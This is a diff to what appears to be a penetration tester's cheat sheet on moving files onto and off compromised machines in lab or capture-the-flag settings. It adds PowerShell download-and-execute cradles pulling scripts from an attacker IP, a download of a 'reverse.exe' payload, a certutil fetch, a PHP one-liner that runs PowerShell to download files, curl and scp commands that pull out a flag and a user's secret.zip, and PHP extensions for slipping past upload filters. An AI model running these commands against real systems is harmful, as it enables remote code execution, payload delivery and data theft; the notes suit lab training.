@@ -27,14 +27,33 @@ def do_PUT(self):
 
 
 # Windows 
-Powershell "IEX(New-Object Net.WebClient).downloadString('http://192.168.181.128/adPEAS.ps1')"
+```powershell
+Powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.4/winpeas.bat')"
 
-Invoke-WebRequest -Uri ATTACK_IP/FILE -OutFile FILE NAME
+IEX(New-Object Net.WebClient).downloadString('http://10.10.16.4/winpeas.bat')
+
+Invoke-WebRequest -Uri 10.10.16.4/winpeas.bbat -OutFile winpeas.bat
+
+````
+
+
+## Certutil
+```bash
+certutil -urlcache -f http://IP/FILE OUTPUTFILENAME
+```
+
 
 # php
+```php
 <?php echo exec("powershell -command \"(New-Object System.Net.WebClient).DownloadFile('http://10.10.17.185/FILE_NAME','OUT_FILE_NAME')\""); ?>
+```
 
-powershell Invoke-WebRequest -Uri http://10.10.14.15/plink.exe -OutFile c:\Users\shaun\Downloads\plink.exe
+```powershell
+powershell Invoke-WebRequest -Uri http://10.10.16.4/winpeas.bat -OutFile winpeas.bat
+
+powershell Invoke-WebRequest -Uri http://10.10.16.4/reverse.exe -OutFile ke.exe
+
+```
 
 # scp 
 scp [OPTION] [user@]SRC_HOST:]file1 user@target:/tmp/FILE:
@@ -44,7 +63,12 @@ P - Specifies the remote host ssh port.
 -p - Preserves files modification and access times.
 -q - Use this option if you want to suppress the progress meter and non-error messages.
 -C - This option forces scp to compresses the data as it is sent to the destination machine.
+```bash
+scp [OPTION] [user@]SRC_HOST:]file1 user@target:/tmp/FILE:
 
+scp charix@10.10.10.84:secret.zip . # getting secret.zip from charix usuer
+
+```
 # Curl
 ```bash
 # Upload file with curl
@@ -53,9 +77,6 @@ curl 192.77.184.2 --upload-file flag.zip
 ```
 
 
-
-# Certutil
-certutil --urlcache -f http://IP/FILE OUTPUTFILENAME
 
 
 
@@ -80,7 +101,7 @@ File C:\Users\administrator\Documents\WindowsPowerShell\Modules\Recon\adPEAS.ps1
 
 **File Upload General Methodology**
 Other useful extensions:
-PHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module
+PHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, phar .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module
 
   Working in PHPv8: .php, .php4, .php5, .phtml, .module, .inc, .hphp, .ctp
 
